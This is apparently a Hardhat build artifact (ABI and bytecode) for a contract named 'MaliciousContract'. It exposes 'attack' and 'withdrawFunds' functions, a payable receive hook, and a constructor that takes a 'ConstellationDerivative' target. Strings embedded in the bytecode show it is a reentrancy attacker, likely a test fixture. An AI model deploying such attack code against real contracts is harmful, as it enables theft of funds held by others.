{
  "_format": "hh-sol-artifact-1",
  "contractName": "MaliciousContract",
  "sourceName": "contracts/MaliciousContract.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract ConstellationDerivative",
          "name": "_target",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balances",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "target",
      "outputs": [
        {
          "internalType": "contract ConstellationDerivative",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdrawFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516104183803806104188339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b03199092169190911790556103b3806100656000396000f3fe6080604052600436106100435760003560e01c806324600fc31461011f57806327e235e3146101365780639e5faafc14610188578063d4b83992146101905761011a565b3661011a576000805460405173ffffffffffffffffffffffffffffffffffffffff9091169034908381818185875af1925050503d80600081146100a2576040519150601f19603f3d011682016040523d82523d6000602084013e6100a7565b606091505b505090508061011757604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601860248201527f5265656e7472616e63792061747461636b206661696c65640000000000000000604482015290519081900360640190fd5b50005b600080fd5b34801561012b57600080fd5b506101346101ce565b005b34801561014257600080fd5b506101766004803603602081101561015957600080fd5b503573ffffffffffffffffffffffffffffffffffffffff1661028b565b60408051918252519081900360200190f35b61013461029d565b34801561019c57600080fd5b506101a561035f565b6040805173ffffffffffffffffffffffffffffffffffffffff9092168252519081900360200190f35b336000908152600160205260409020548061024a57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601460248201527f4e6f2066756e647320746f207769746864726177000000000000000000000000604482015290519081900360640190fd5b604051339082156108fc029083906000818181858888f19350505050158015610277573d6000803e3d6000fd5b505033600090815260016020526040812055565b60016020526000908152604090205481565b604051600090309034908381818185875af1925050503d80600081146102df576040519150601f19603f3d011682016040523d82523d6000602084013e6102e4565b606091505b505090508061035457604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601860248201527f5265656e7472616e63792061747461636b206661696c65640000000000000000604482015290519081900360640190fd5b61035c61037b565b50565b60005473ffffffffffffffffffffffffffffffffffffffff1681565b56fea264697066735822122000807b8733bfe091a9f7780a2554be355a713662ffbf263f53ec27334859317464736f6c63430006080033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}